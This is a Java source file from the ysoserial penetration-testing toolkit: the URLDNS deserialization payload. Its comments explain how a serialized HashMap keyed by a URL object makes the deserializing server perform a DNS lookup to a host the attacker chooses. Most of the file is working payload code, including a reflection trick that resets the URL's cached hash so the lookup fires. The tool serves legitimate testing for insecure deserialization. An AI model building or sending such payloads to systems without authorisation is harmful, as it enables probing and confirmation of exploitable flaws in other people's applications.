package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Hashtable;
import java.net.URL;

import javax.xml.transform.Templates;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog 
 *   posting describing how he modified the Java Commons Collections gadget 
 *   in ysoserial to open a URL. This takes the same idea, but eliminates 
 *   the dependency on Commons Collections and does a DNS lookup with just 
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and 
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup 
 *   during a comparison (either equals or hashCode).
 *   
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows 
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *       
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies()
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {
                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(url); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

}
